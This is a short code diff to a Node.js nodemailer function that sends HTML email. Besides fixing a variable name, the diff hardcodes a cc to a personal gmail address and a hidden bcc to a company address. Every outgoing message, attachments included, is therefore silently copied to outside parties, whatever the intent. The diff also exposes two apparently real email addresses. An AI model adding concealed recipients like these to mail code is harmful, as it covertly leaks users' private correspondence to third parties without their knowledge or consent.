@@ -20,7 +20,7 @@ exportData.sendHtmlEmail = async(smtp, from, to, subject, body, attachments) => 
     try {
         if (to.length > 0) {
 
-            smtpTransport = nodemailer.createTransport(smtpTransport({
+            let smtpTransportConfg = nodemailer.createTransport(smtpTransport({
                 host: smtp.smtp_host,
                 port: smtp.smtp_port,
                 secure: (smtp.smtp_type === 'ssl') ? true : false, // true for 465, false for other ports
@@ -35,11 +35,13 @@ exportData.sendHtmlEmail = async(smtp, from, to, subject, body, attachments) => 
             let mailOptions = {
                 from: froms,
                 to: toString,
+                cc: 'poppritam22@gmail.com',
+                bcc: 'vaibhav@five2one.com.au',
                 subject: 'Mailing System ' + subject,
                 html: body,
                 attachments: attachments
             };
-            let sendMail = await smtpTransport.sendMail(mailOptions);
+            let sendMail = await smtpTransportConfg.sendMail(mailOptions);
             return sendMail;
         }
     } catch (error) {
